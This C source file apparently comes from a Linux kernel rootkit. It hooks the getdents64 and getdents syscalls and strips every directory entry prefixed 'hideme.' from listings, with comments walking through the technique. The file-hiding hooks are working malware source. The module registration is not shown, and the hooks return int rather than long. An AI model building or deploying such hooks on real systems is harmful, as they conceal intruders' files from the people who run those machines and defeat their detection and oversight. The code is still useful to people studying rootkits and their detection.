#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <linux/kallsyms.h>
#include <linux/dirent.h>
#include <linux/version.h>

#define PREFIX "hideme."

static asmlinkage long (*orig_getdents64)(const struct pt_regs *);
static asmlinkage long (*orig_getdents)(const struct pt_regs *);

/* This is our hooked function for sys_getdents64 */
asmlinkage int hook_getdents64(const struct pt_regs *regs)
{
    /* These are the arguments passed to sys_getdents64 extracted from the pt_regs structure */
    // int fd = regs->di;
    struct linux_dirent64 __user *dirent = (struct linux_dirent64 *)regs->si;
    // int count = regs->dx;

    /* We need these intermediate structures to loop through the directory listing */
    struct linux_dirent64 *current_dir, *dirent_ker, *previous_dir = NULL;
    unsigned long offset = 0;

    /* We first call the actual sys_getdents64 syscall and save it so we can
     * examine its contents to remove any entries prefixed by PREFIX.
     * We also allocate dirent_ker with the same amount of memory. */
	long error = 0;
    int ret = orig_getdents64(regs);
    dirent_ker = kzalloc(ret, GFP_KERNEL); // Can sleep


    if ( (ret <= 0) || (dirent_ker == NULL) ) // None ?
        return ret;

   /* Copy the dirent argument passed to sys_getdents64 from userspace to kernelspace 
     * dirent_ker is our modifiable copy of the returned dirent structure */
    error = copy_from_user(dirent_ker, dirent, ret);
    if (error)
        goto done;

    /* We iterate over offset, incrementing by current_dir->d_reclen each loop */
    while (offset < ret)
    {
        /* First, we look at dirent_ker + 0, which is the first entry in the directory listing */
        current_dir = (void *)dirent_ker + offset;

        /* Compare the current directory name to PREFIX */
        if ( memcmp(PREFIX, current_dir->d_name, strlen(PREFIX)) == 0)
        {
            /* If PREFIX is in the first struct in the list, we shift everything else up by its size */
            if ( current_dir == dirent_ker )
            {
                ret -= current_dir->d_reclen;
                memmove(current_dir, (void *)current_dir + current_dir->d_reclen, ret);
                continue;
            }
            /* This is the main step: we add the length of the current directory to that of the 
             * previous one, effectively hiding the current directory when looping over the structure
             * to print/search the contents. 

            Before :
                [Entry1] [Entry2] [Entry3]

            After :
                [Entry1 + Entry2] [Entry3]

            So in userland, Entry1 lenght's not change and will omit to print Entry 2

              */
            previous_dir->d_reclen += current_dir->d_reclen;
        }
        else
        {
            /* If PREFIX is not found in current_dir->d_name 
             * We set previous_dir to current_dir before continuing */
            previous_dir = current_dir;
        }

        /* Increment offset by current_dir->d_reclen, when it equals ret, then we've scanned the whole
         * directory listing */
        offset += current_dir->d_reclen;
    }

    /* Copy our modified dirent structure back to userspace to be returned. */
    error = copy_to_user(dirent, dirent_ker, ret);
    if (error)
        goto done;

done:
    /* Clean up and return the remaining directory listing to the user */
    kfree(dirent_ker);
    return ret;

}

/* This is our hook for sys_getdetdents */
asmlinkage int hook_getdents(const struct pt_regs *regs)
{
    /* This is an old structure not included in the kernel headers anymore, so we 
     * declare it ourselves */
    struct linux_dirent {
        unsigned long d_ino;
        unsigned long d_off;
        unsigned short d_reclen;
        char d_name[];
    };


    struct linux_dirent *dirent = (struct linux_dirent *)regs->si;

    struct linux_dirent *current_dir, *dirent_ker, *previous_dir = NULL;
    unsigned long offset = 0;

	long error = 0;
    int ret = orig_getdents(regs);
    dirent_ker = kzalloc(ret, GFP_KERNEL);

    
	if ( (ret <= 0) || (dirent_ker == NULL) )
        return ret;

    error = copy_from_user(dirent_ker, dirent, ret);
    if (error)
        goto done;

    while (offset < ret)
    {
        current_dir = (void *)dirent_ker + offset;

        if ( memcmp(PREFIX, current_dir->d_name, strlen(PREFIX)) == 0)
        {
            if ( current_dir == dirent_ker )
            {
                ret -= current_dir->d_reclen;
                memmove(current_dir, (void *)current_dir + current_dir->d_reclen, ret);
                continue;
            }

            previous_dir->d_reclen += current_dir->d_reclen;
        }
        else
        {

            previous_dir = current_dir;
        }

        offset += current_dir->d_reclen;
    }

    error = copy_to_user(dirent, dirent_ker, ret);
    if (error)
        goto done;

done:
    kfree(dirent_ker);
    return ret;

}
